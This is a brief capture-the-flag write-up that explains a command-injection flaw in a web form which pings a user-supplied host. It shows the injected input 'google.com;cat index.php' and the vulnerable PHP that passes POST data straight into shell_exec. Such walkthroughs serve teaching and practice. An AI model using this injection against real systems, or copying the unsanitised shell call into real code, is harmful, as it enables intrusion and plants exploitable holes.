It seems that you can ping a website by entering his name in the form. By looking at the result, it seems like it is only displaying the result of

```bash
ping YOUR_ENTRY
```

If we are lucky, it is creating a shell to do this.

Then, we enter google.com;cat index.php

So the executed command becomes:

```
ping google.com;cat index.php
```

We see the result of the ping command, and if we open the source code, we can see:
```html
<pre>
<?php
$flag = ...;
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
</pre>
```

You found the flag by injecting a malicious command ! Congratz !
